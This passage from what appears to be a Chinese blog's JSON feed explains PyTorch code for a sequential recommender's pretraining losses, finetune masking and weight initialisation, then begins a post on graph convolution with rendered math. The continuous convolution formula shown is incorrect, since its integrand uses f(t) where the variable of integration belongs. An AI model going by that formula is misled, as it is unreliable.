class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">pretrain</span>(<span class=\"params\">self, attributes, masked_item_sequence, pos_items, neg_items,</span></span><br><span class=\"line\"><span class=\"params\">             masked_segment_sequence, pos_segment, neg_segment</span>):</span><br><span class=\"line\">    sequence_emb = self.add_position_embedding(masked_item_sequence)</span><br><span class=\"line\">    sequence_mask = (masked_item_sequence == <span class=\"number\">0</span>).<span class=\"built_in\">float</span>() * -<span class=\"number\">1e8</span></span><br><span class=\"line\">    sequence_mask = torch.unsqueeze(torch.unsqueeze(sequence_mask, <span class=\"number\">1</span>), <span class=\"number\">1</span>)</span><br><span class=\"line\">    encoded_layers = self.item_encoder(sequence_emb, sequence_mask, output_all_encoded_layers=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    sequence_output = encoded_layers[-<span class=\"number\">1</span>]</span><br><span class=\"line\">    attribute_embeddings = self.attribute_embeddings.weight</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># AAP</span></span><br><span class=\"line\">    aap_score = self.associated_attribute_prediction(sequence_output, attribute_embeddings)</span><br><span class=\"line\">    aap_loss = self.criterion(aap_score, attributes.view(-<span class=\"number\">1</span>, self.args.attribute_size).<span class=\"built_in\">float</span>())</span><br><span class=\"line\">    aap_mask = (masked_item_sequence != self.args.mask_id).<span class=\"built_in\">float</span>() * (masked_item_sequence != <span class=\"number\">0</span>).<span class=\"built_in\">float</span>()</span><br><span class=\"line\">    aap_loss = torch.<span class=\"built_in\">sum</span>(aap_loss * aap_mask.flatten().unsqueeze(-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># MIP</span></span><br><span class=\"line\">    pos_item_embs = self.item_embeddings(pos_items)</span><br><span class=\"line\">    neg_item_embs = self.item_embeddings(neg_items)</span><br><span class=\"line\">    pos_score = self.masked_item_prediction(sequence_output, pos_item_embs)</span><br><span class=\"line\">    neg_score = self.masked_item_prediction(sequence_output, neg_item_embs)</span><br><span class=\"line\">    mip_distance = torch.sigmoid(pos_score - neg_score)</span><br><span class=\"line\">    mip_loss = self.criterion(mip_distance, torch.ones_like(mip_distance, dtype=torch.float32))</span><br><span class=\"line\">    mip_mask = (masked_item_sequence == self.args.mask_id).<span class=\"built_in\">float</span>()</span><br><span class=\"line\">    mip_loss = torch.<span class=\"built_in\">sum</span>(mip_loss * mip_mask.flatten())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># MAP</span></span><br><span class=\"line\">    map_score = self.masked_attribute_prediction(sequence_output, attribute_embeddings)</span><br><span class=\"line\">    map_loss = self.criterion(map_score, attributes.view(-<span class=\"number\">1</span>, self.args.attribute_size).<span class=\"built_in\">float</span>())</span><br><span class=\"line\">    map_mask = (masked_item_sequence == self.args.mask_id).<span class=\"built_in\">float</span>()</span><br><span class=\"line\">    map_loss = torch.<span class=\"built_in\">sum</span>(map_loss * map_mask.flatten().unsqueeze(-<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># SP</span></span><br><span class=\"line\">    segment_context = self.add_position_embedding(masked_segment_sequence)</span><br><span class=\"line\">    segment_mask = (masked_segment_sequence == <span class=\"number\">0</span>).<span class=\"built_in\">float</span>() * -<span class=\"number\">1e8</span></span><br><span class=\"line\">    segment_mask = torch.unsqueeze(torch.unsqueeze(segment_mask, <span class=\"number\">1</span>), <span class=\"number\">1</span>)</span><br><span class=\"line\">    segment_encoded_layers = self.item_encoder(segment_context, segment_mask, output_all_encoded_layers=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    segment_context = segment_encoded_layers[-<span class=\"number\">1</span>][:, -<span class=\"number\">1</span>, :]</span><br><span class=\"line\"></span><br><span class=\"line\">    pos_segment_emb = self.add_position_embedding(pos_segment)</span><br><span class=\"line\">    pos_segment_mask = (pos_segment == <span class=\"number\">0</span>).<span class=\"built_in\">float</span>() * -<span class=\"number\">1e8</span></span><br><span class=\"line\">    pos_segment_mask = torch.unsqueeze(torch.unsqueeze(pos_segment_mask, <span class=\"number\">1</span>), <span class=\"number\">1</span>)</span><br><span class=\"line\">    pos_segment_encoded_layers = self.item_encoder(pos_segment_emb, pos_segment_mask, output_all_encoded_layers=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    pos_segment_emb = pos_segment_encoded_layers[-<span class=\"number\">1</span>][:, -<span class=\"number\">1</span>, :]</span><br><span class=\"line\"></span><br><span class=\"line\">    neg_segment_emb = self.add_position_embedding(neg_segment)</span><br><span class=\"line\">    neg_segment_mask = (neg_segment == <span class=\"number\">0</span>).<span class=\"built_in\">float</span>() * -<span class=\"number\">1e8</span></span><br><span class=\"line\">    neg_segment_mask = torch.unsqueeze(torch.unsqueeze(neg_segment_mask, <span class=\"number\">1</span>), <span class=\"number\">1</span>)</span><br><span class=\"line\">    neg_segment_encoded_layers = self.item_encoder(neg_segment_emb, neg_segment_mask, output_all_encoded_layers=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    neg_segment_emb = neg_segment_encoded_layers[-<span class=\"number\">1</span>][:, -<span class=\"number\">1</span>, :]</span><br><span class=\"line\"></span><br><span class=\"line\">    pos_segment_score = self.segment_prediction(segment_context, pos_segment_emb)</span><br><span class=\"line\">    neg_segment_score = self.segment_prediction(segment_context, neg_segment_emb)</span><br><span class=\"line\">    sp_distance = torch.sigmoid(pos_segment_score - neg_segment_score)</span><br><span class=\"line\">    sp_loss = torch.<span class=\"built_in\">sum</span>(self.criterion(sp_distance, torch.ones_like(sp_distance, dtype=torch.float32)))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> aap_loss, mip_loss, map_loss, sp_loss</span><br></pre></td></tr></table></figure></p>\n<p><strong>添加位置嵌入并计算序列输出</strong>：</p>\n<ul>\n<li><code>sequence_emb = self.add_position_embedding(masked_item_sequence)</code> ：对掩码的项目序列添加位置嵌入。</li>\n<li><code>sequence_mask = (masked_item_sequence == 0).float() * -1e8</code> ：生成序列掩码，填充值为  <code>0</code>  的位置设置为一个大负数，以便在注意力计算时忽略这些位置。</li>\n<li><code>sequence_mask = torch.unsqueeze(torch.unsqueeze(sequence_mask, 1), 1)</code> ：调整掩码的形状。</li>\n<li><code>encoded_layers = self.item_encoder(sequence_emb, sequence_mask, output_all_encoded_layers=True)</code> ：通过编码器计算序列的编码层。</li>\n<li><code>sequence_output = encoded_layers[-1]</code> ：获取最后一层的输出。</li>\n</ul>\n<p><strong>关联属性预测 (AAP)</strong>：</p>\n<ul>\n<li><code>aap_score = self.associated_attribute_prediction(sequence_output, attribute_embeddings)</code> ：计算关联属性预测得分。</li>\n<li><code>aap_loss = self.criterion(aap_score, attributes.view(-1, self.args.attribute_size).float())</code> ：计算 AAP 损失。</li>\n<li><code>aap_mask = (masked_item_sequence != self.args.mask_id).float() * (masked_item_sequence != 0).float()</code> ：生成 AAP 掩码。</li>\n<li><code>aap_loss = torch.sum(aap_loss * aap_mask.flatten().unsqueeze(-1))</code> ：加权计算 AAP 损失。</li>\n</ul>\n<p><strong>掩码项目预测 (MIP)</strong>：</p>\n<ul>\n<li><code>pos_item_embs = self.item_embeddings(pos_items)</code> ：获取正样本的项目嵌入。</li>\n<li><code>neg_item_embs = self.item_embeddings(neg_items)</code> ：获取负样本的项目嵌入。</li>\n<li><code>pos_score = self.masked_item_prediction(sequence_output, pos_item_embs)</code> ：计算正样本得分。</li>\n<li><code>neg_score = self.masked_item_prediction(sequence_output, neg_item_embs)</code> ：计算负样本得分。</li>\n<li><code>mip_distance = torch.sigmoid(pos_score - neg_score)</code> ：计算正负样本得分差的 Sigmoid 值。</li>\n<li><code>mip_loss = self.criterion(mip_distance, torch.ones_like(mip_distance, dtype=torch.float32))</code> ：计算 MIP 损失。</li>\n<li><code>mip_mask = (masked_item_sequence == self.args.mask_id).float()</code> ：生成 MIP 掩码。</li>\n<li><code>mip_loss = torch.sum(mip_loss * mip_mask.flatten())</code> ：加权计算 MIP 损失。</li>\n</ul>\n<p><strong>掩码属性预测 (MAP)</strong>：</p>\n<ul>\n<li><code>map_score = self.masked_attribute_prediction(sequence_output, attribute_embeddings)</code> ：计算掩码属性预测得分。</li>\n<li><code>map_loss = self.criterion(map_score, attributes.view(-1, self.args.attribute_size).float())</code> ：计算 MAP 损失。</li>\n<li><code>map_mask = (masked_item_sequence == self.args.mask_id).float()</code> ：生成 MAP 掩码。</li>\n<li><code>map_loss = torch.sum(map_loss * map_mask.flatten().unsqueeze(-1))</code> ：加权计算 MAP 损失。</li>\n</ul>\n<p><strong>段落预测 (SP)</strong>：</p>\n<ul>\n<li>\n<p><code>segment_context = self.add_position_embedding(masked_segment_sequence)</code> ：对掩码的段落序列添加位置嵌入。</p>\n</li>\n<li>\n<p><code>segment_mask = (masked_segment_sequence == 0).float() * -1e8</code> ：生成段落掩码。</p>\n</li>\n<li>\n<p><code>segment_mask = torch.unsqueeze(torch.unsqueeze(segment_mask, 1), 1)</code> ：调整掩码的形状。</p>\n</li>\n<li>\n<p><code>segment_encoded_layers = self.item_encoder(segment_context, segment_mask, output_all_encoded_layers=True)</code> ：通过编码器计算段落的编码层。</p>\n</li>\n<li>\n<p><code>segment_context = segment_encoded_layers[-1][:, -1, :]</code> ：获取最后一层的段落上下文。</p>\n</li>\n<li>\n<p>对正样本和负样本重复上述步骤：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pos_segment_emb = self.add_position_embedding(pos_segment)</span><br><span class=\"line\">pos_segment_mask = (pos_segment == <span class=\"number\">0</span>).<span class=\"built_in\">float</span>() * -<span class=\"number\">1e8</span></span><br><span class=\"line\">pos_segment_mask = torch.unsqueeze(torch.unsqueeze(pos_segment_mask, <span class=\"number\">1</span>), <span class=\"number\">1</span>)</span><br><span class=\"line\">pos_segment_encoded_layers = self.item_encoder(pos_segment_emb, pos_segment_mask, output_all_encoded_layers=<span class=\"literal\">True</span>)</span><br><span class=\"line\">pos_segment_emb = pos_segment_encoded_layers[-<span class=\"number\">1</span>][:, -<span class=\"number\">1</span>, :]</span><br><span class=\"line\">neg_segment_emb = self.add_position_embedding(neg_segment)</span><br><span class=\"line\">neg_segment_mask = (neg_segment == <span class=\"number\">0</span>).<span class=\"built_in\">float</span>() * -<span class=\"number\">1e8</span></span><br><span class=\"line\">neg_segment_mask = torch.unsqueeze(torch.unsqueeze(neg_segment_mask, <span class=\"number\">1</span>), <span class=\"number\">1</span>)</span><br><span class=\"line\">neg_segment_encoded_layers = self.item_encoder(neg_segment_emb, neg_segment_mask, output_all_encoded_layers=<span class=\"literal\">True</span>)</span><br><span class=\"line\">neg_segment_emb = neg_segment_encoded_layers[-<span class=\"number\">1</span>][:, -<span class=\"number\">1</span>, :]</span><br><span class=\"line\">pos_segment_score = self.segment_prediction(segment_context, pos_segment_emb)</span><br><span class=\"line\">neg_segment_score = self.segment_prediction(segment_context, neg_segment_emb)</span><br><span class=\"line\">sp_distance = torch.sigmoid(pos_segment_score - neg_segment_score)</span><br><span class=\"line\">sp_loss = torch.<span class=\"built_in\">sum</span>(self.criterion(sp_distance, torch.ones_like(sp_distance, dtype=torch.float32)))</span><br></pre></td></tr></table></figure></p>\n</li>\n</ul>\n<h3 id=\"微调\"><a class=\"anchor\" href=\"#微调\">#</a> 微调</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">finetune</span>(<span class=\"params\">self, input_ids</span>):</span><br><span class=\"line\">    attention_mask = (input_ids &gt; <span class=\"number\">0</span>).long()</span><br><span class=\"line\">    extended_attention_mask = attention_mask.unsqueeze(<span class=\"number\">1</span>).unsqueeze(<span class=\"number\">2</span>)</span><br><span class=\"line\">    max_len = attention_mask.size(-<span class=\"number\">1</span>)</span><br><span class=\"line\">    attn_shape = (<span class=\"number\">1</span>, max_len, max_len)</span><br><span class=\"line\">    subsequent_mask = torch.triu(torch.ones(attn_shape), diagonal=<span class=\"number\">1</span>)</span><br><span class=\"line\">    subsequent_mask = (subsequent_mask == <span class=\"number\">0</span>).unsqueeze(<span class=\"number\">1</span>).long()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> self.args.cuda_condition:</span><br><span class=\"line\">        subsequent_mask = subsequent_mask.cuda()</span><br><span class=\"line\"></span><br><span class=\"line\">    extended_attention_mask = extended_attention_mask * subsequent_mask</span><br><span class=\"line\">    extended_attention_mask = extended_attention_mask.to(dtype=<span class=\"built_in\">next</span>(self.parameters()).dtype)</span><br><span class=\"line\">    extended_attention_mask = (<span class=\"number\">1.0</span> - extended_attention_mask) * -<span class=\"number\">10000.0</span></span><br><span class=\"line\"></span><br><span class=\"line\">    sequence_emb = self.add_position_embedding(input_ids)</span><br><span class=\"line\">    item_encoded_layers = self.item_encoder(sequence_emb, extended_attention_mask, output_all_encoded_layers=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    sequence_output = item_encoded_layers[-<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sequence_output</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>\n<p><strong>生成注意力掩码</strong>：对输入的  <code>input_ids</code>  生成掩码，填充值为  <code>0</code>  的位置设置为  <code>0</code> ，其他位置设置为  <code>1</code> 。</p>\n</li>\n<li>\n<p><strong>扩展注意力掩码</strong>：对注意力掩码进行扩展，使其形状变为  <code>[batch_size, 1, 1, seq_length]</code> 。</p>\n</li>\n<li>\n<p><strong>生成后续掩码</strong>：</p>\n<ul>\n<li><code>max_len</code>  获取序列的最大长度。</li>\n<li><code>attn_shape</code>  定义了掩码的形状  <code>[1, max_len, max_len]</code> 。</li>\n<li><code>subsequent_mask</code>  使用  <code>torch.triu</code>  生成上三角矩阵，用于屏蔽后续的时间步。</li>\n<li>将  <code>subsequent_mask</code>  的形状扩展为  <code>[1, 1, max_len, max_len]</code> 。如果使用 CUDA，将掩码移动到 GPU。</li>\n</ul>\n</li>\n<li>\n<p><strong>组合掩码</strong>：<br />\n将扩展的注意力掩码与后续掩码相乘。</p>\n<p>将掩码转换为与模型参数相同的数据类型。</p>\n<p>将掩码从  <code>1</code>  转换为  <code>0</code> ，从  <code>0</code>  转换为  <code>-10000.0</code> ，这样可以在注意力计算时有效地屏蔽那些位置。</p>\n</li>\n<li>\n<p>对输入的  <code>input_ids</code>  添加位置嵌入。</p>\n</li>\n<li>\n<p>使用编码器处理嵌入后的序列和扩展的注意力掩码。</p>\n</li>\n<li>\n<p>获取编码器的最后一层输出  <code>sequence_output</code> 。</p>\n</li>\n</ul>\n<h3 id=\"初始化权重\"><a class=\"anchor\" href=\"#初始化权重\">#</a> 初始化权重</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">init_weights</span>(<span class=\"params\">self, module</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(module, (nn.Linear, nn.Embedding)):</span><br><span class=\"line\">        module.weight.data.normal_(mean=<span class=\"number\">0.0</span>, std=self.args.initializer_range)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> <span class=\"built_in\">isinstance</span>(module, LayerNorm):</span><br><span class=\"line\">        module.bias.data.zero_()</span><br><span class=\"line\">        module.weight.data.fill_(<span class=\"number\">1.0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(module, nn.Linear) <span class=\"keyword\">and</span> module.bias <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        module.bias.data.zero_()</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><strong>判断模块类型并初始化权重</strong>\n<ul>\n<li>检查模块是否是  <code>nn.Linear</code>  或  <code>nn.Embedding</code>  类型。</li>\n<li>如果是，将其权重初始化为均值为 0.0，标准差为  <code>self.args.initializer_range</code>  的正态分布。</li>\n<li>这样做的目的是确保网络在初始时具有适当的权重分布，避免梯度消失或爆炸问题。</li>\n</ul>\n</li>\n<li>检查模块是否是  <code>LayerNorm</code>  类型。</li>\n<li>如果是，将其偏置初始化为 0，将其权重初始化为 1。</li>\n<li>这样做是因为层归一化通常希望初始时对输入数据不进行任何缩放或平移。</li>\n<li>检查模块是否是  <code>nn.Linear</code>  类型，并且其偏置不为空。</li>\n<li>如果是，将其偏置初始化为 0。</li>\n<li>这样做可以确保线性层的偏置在初始时不会对输入数据产生任何偏移。</li>\n</ul>\n",
            "tags": [
                "Hexo",
                "Front Matter",
                "code",
                "recommendation"
            ]
        },
        {
            "id": "https://enjundu.github.io/recommendation/basic_knowledge/",
            "url": "https://enjundu.github.io/recommendation/basic_knowledge/",
            "title": "basic_knowledge",
            "date_published": "2024-07-14T01:41:31.000Z",
            "content_html": "<h1 id=\"gcn\"><a class=\"anchor\" href=\"#gcn\">#</a> GCN</h1>\n<h2 id=\"卷积\"><a class=\"anchor\" href=\"#卷积\">#</a> 卷积</h2>\n<p>卷积是两个函数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi></mrow><annotation encoding=\"application/x-tex\">f</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>g</mi></mrow><annotation encoding=\"application/x-tex\">g</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span></span></span></span> 的数学运算，产生第三个函数<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi></mrow><annotation encoding=\"application/x-tex\">h</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span></span></span></span></p>\n<p>卷积定义公式：</p>\n<p>​\t连续情况：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>h</mi><mo stretchy=\"false\">(</mo><mi>t</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo stretchy=\"false\">(</mo><mi>f</mi><mo>∗</mo><mi>g</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><mi>t</mi><mo stretchy=\"false\">)</mo><mo><mover><mo><mo>=</mo></mo><mrow><mi mathvariant=\"normal\">d</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">f</mi></mrow></mover></mo><mo>∫</mo><mi>f</mi><mo stretchy=\"false\">(</mo><mi>t</mi><mo stretchy=\"false\">)</mo><mi>g</mi><mo stretchy=\"false\">(</mo><mi>t</mi><mo>−</mo><mi>τ</mi><mo stretchy=\"false\">)</mo><mi>d</mi><mi>τ</mi></mrow><annotation encoding=\"application/x-tex\">h(t)=(f*g)(t)\\stackrel{\\mathrm{def}}{=}\\int f(t)g(t-\\tau) d\\tau\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">t</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.402978em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">t</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.152978em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">=</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathrm mtight\">d</span><span class=\"mord mathrm mtight\">e</span><span class=\"mord mathrm mtight\" style=\"margin-right:0.07778em;\">f</span></span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.22225em;vertical-align:-0.86225em;\"></span><span class=\"mop op-symbol large-op\" style=\"margin-right:0.44445em;position:relative;top:-0.0011249999999999316em;\">∫</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">t</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">t</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.1132em;\">τ</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\" style=\"margin-right:0.1132em;\">τ</span></span></span></span></span></p>\n<p>​\t离散情况：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>h</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>=</mo><mo stretchy=\"false\">(</mo><mi>f</mi><mo>∗</mo><mi>g</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo><mover><mo><mo>=</mo></mo><mrow><mi mathvariant=\"normal\">d</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">f</mi></mrow></mover></mo><munder><mo>∑</mo><mrow><mi>m</mi><mo separator=\"true\">,</mo><mi>n</mi></mrow></munder><mi>f</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo>−</mo><mi>m</mi><mo separator=\"true\">,</mo><mi>y</mi><mo>−</mo><mi>n</mi><mo stretchy=\"false\">)</mo><mi>g</mi><mo stretchy=\"false\">(</mo><mi>m</mi><mo separator=\"true\">,</mo><mi>n</mi><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;h(x,y) \\\\\n&amp;=(f*g)(x,y) \\\\\n&amp;\\stackrel{\\mathrm{def}}{=}\\sum_{m,n}f(x-m,y-n)g(m,n)\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:5.839091000000001em;vertical-align:-2.669545500000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.1695455em;\"><span style=\"top:-5.4825235em;\"><span class=\"pstrut\" style=\"height:3.152978em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.9825235em;\"><span class=\"pstrut\" style=\"height:3.152978em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.169545499999999em;\"><span class=\"pstrut\" style=\"height:3.152978em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.669545500000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:3.1695455em;\"><span style=\"top:-5.4825235em;\"><span class=\"pstrut\" style=\"height:3.152978em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\">h</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span><span style=\"top:-3.9825235em;\"><span class=\"pstrut\" style=\"height:3.152978em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mclose\">)</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span></span></span><span style=\"top:-2.169545499999999em;\"><span class=\"pstrut\" style=\"height:3.152978em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.152978em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">=</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\"><span class=\"mord mathrm mtight\">d</span><span class=\"mord mathrm mtight\">e</span><span 